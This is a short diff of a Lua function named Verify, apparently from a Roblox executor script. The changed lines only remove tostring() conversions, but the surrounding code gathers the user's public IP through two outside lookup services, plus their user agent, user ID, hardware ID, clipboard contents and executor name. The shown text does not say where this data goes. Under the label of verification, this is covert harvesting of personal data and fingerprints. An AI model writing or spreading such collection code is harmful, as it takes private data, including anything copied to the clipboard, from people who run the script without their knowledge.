@@ -28,9 +28,9 @@ function Verify(t, s, n)
             List = t,
             IP = GetJson("https://cz88.net/api/cz88/ip/accurate?ip="..GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
             UA = HS:GetUserAgent(),
-            Group = tostring(n),
-            Game = tostring(game.GameId),
-            User = tostring(LP.UserId),
+            Group = n,
+            Game = game.GameId,
+            User = LP.UserId,
             Hwid = gethwid(),
             Clipboard = getclipboard(),
             Executor = identifyexecutor()
